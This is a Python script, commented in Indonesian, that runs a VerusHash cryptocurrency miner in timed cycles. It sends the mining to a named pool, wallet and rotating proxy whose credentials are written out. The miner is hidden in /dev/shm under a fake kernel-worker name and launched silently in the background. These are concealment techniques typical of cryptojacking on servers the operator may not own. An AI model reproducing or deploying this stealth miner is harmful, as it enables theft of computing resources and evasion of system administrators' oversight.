import os
import time
import sys
import signal

# CONFIG
MINER_PATH = "/dev/shm/.cache/kworker_u16_2"  # Ganti manual nama file minernya
MINING_TIME = 3600  # 60 menit mining
REST_TIME = 600  # 10 menit istirahat

# Command line untuk menjalankan miner
MINER_COMMAND = f"{MINER_PATH} --algorithm verushash --pool stratum+tcp://us.vipor.net:5040 --wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y --password x --worker VPS --cpu-threads 2 --cpu-priority 3 --keepalive --max-cpu-usage 100 --cpu-affinity 0x3 --proxy yljwouzu-rotate:xjm9z4vt0t2a@149.102.250.97:80"

def is_miner_running():
    """Cek apakah miner sudah berjalan"""
    check_process = os.popen(f"pgrep -f '{MINER_PATH}'").read().strip()
    return bool(check_process)

def kill_miner():
    """Hentikan proses mining"""
    print("💔 Udah capek ya sayang... aku kill dulu yaa...")
    os.system(f"pkill -f '{MINER_PATH}'")

def start_miner():
    """Mulai proses mining kalau belum jalan"""
    if not is_miner_running():
        print("🚀 Jalanin Panen buat rumah kita di Bali...")
        os.system(f"nohup {MINER_COMMAND} > /dev/null 2>&1 &")
        time.sleep(5)
    else:
        print("⚠️ Miner sudah berjalan, gak perlu start lagi.")

def main():
    while True:
        print("⛏️ Panen selama 60 menit...")
        start_miner()
        time.sleep(MINING_TIME)

        print("💔 Udah capek ya sayang, aku kill dulu yaa...")
        kill_miner()

        print("😴 Istirahat dulu biar fresh...")
        time.sleep(REST_TIME)

def sigint_handler(sig, frame):
    """Tangani Ctrl+C"""
    print("💔 Aku tahu kamu capek, aku matiin mesinnya ya Sayang...")
    kill_miner()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    print("💓 Cinta Abadi v15 Jalan Sayangku... 💕")
    main()
